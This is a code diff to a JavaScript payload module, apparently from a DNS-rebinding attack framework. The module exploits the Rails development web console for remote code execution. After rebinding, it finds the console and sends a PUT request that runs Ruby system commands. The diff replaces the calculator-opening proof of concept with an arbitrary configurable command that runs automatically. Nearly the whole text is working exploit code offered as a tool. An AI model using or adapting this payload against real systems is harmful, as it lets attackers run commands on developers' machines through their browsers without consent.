@@ -13,7 +13,14 @@ https://edgeguides.rubyonrails.org/6_0_release_notes.html#railties-notable-chang
 const RailsConsoleRce = () => {
 
     // Invoked after DNS rebinding has been performed
-    function attack(headers, cookie, body) {
+    function attack(headers, cookie, body, wsProxyPort, options) {
+        options = options || { headers: {}, config: {} };
+        const config = options.config || {};
+
+        // Get command from config, default to Rails.env
+        const command = config.command || "puts Rails.env";
+        const autoExecute = config.autoExecute !== false; // default is true for backwards compatibility
+
         let myHeaders = new Headers();
 
         sooFetch('/nonexistingpage')
@@ -35,20 +42,32 @@ const RailsConsoleRce = () => {
                 myHeaders.append("X-Requested-With", "XMLHttpRequest");
                 myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
 
-                sooFetch(path, {
-                    method: 'PUT',
-                    headers: myHeaders,
-                    //body: "input=system(%22calc%22)" // Windows
-                    //body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
-                    //body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
-                    body: "input=system(%22open%20%2fApplications%2fCalculator.app%26xcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app&xcalc&")
-                })
+                if (autoExecute) {
+                    // Execute the configured command
+                    const encodedCommand = encodeURIComponent(command);
+                    console.log(`Executing command: ${command}`);
+                    sooFetch(path, {
+                        method: 'PUT',
+                        headers: myHeaders,
+                        body: `input=${encodedCommand}`
+                    })
+                } else {
+                    // Original default behavior - open calculator
+                    sooFetch(path, {
+                        method: 'PUT',
+                        headers: myHeaders,
+                        //body: "input=system(%22calc%22)" // Windows
+                        //body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
+                        //body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
+                        body: "input=system(%22open%20%2fApplications%2fCalculator.app%26xcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app&xcalc&")
+                    })
+                }
             })
     }
 
     // Invoked to determine whether the rebinded service
     // is the one targeted by this payload. Must return true or false.
-    async function isService(headers, cookie, body) {
+    async function isService(headers, cookie, body, options) {
         return sooFetch("/nonexistingpage",{
             mode: 'no-cors',
             credentials: 'omit',
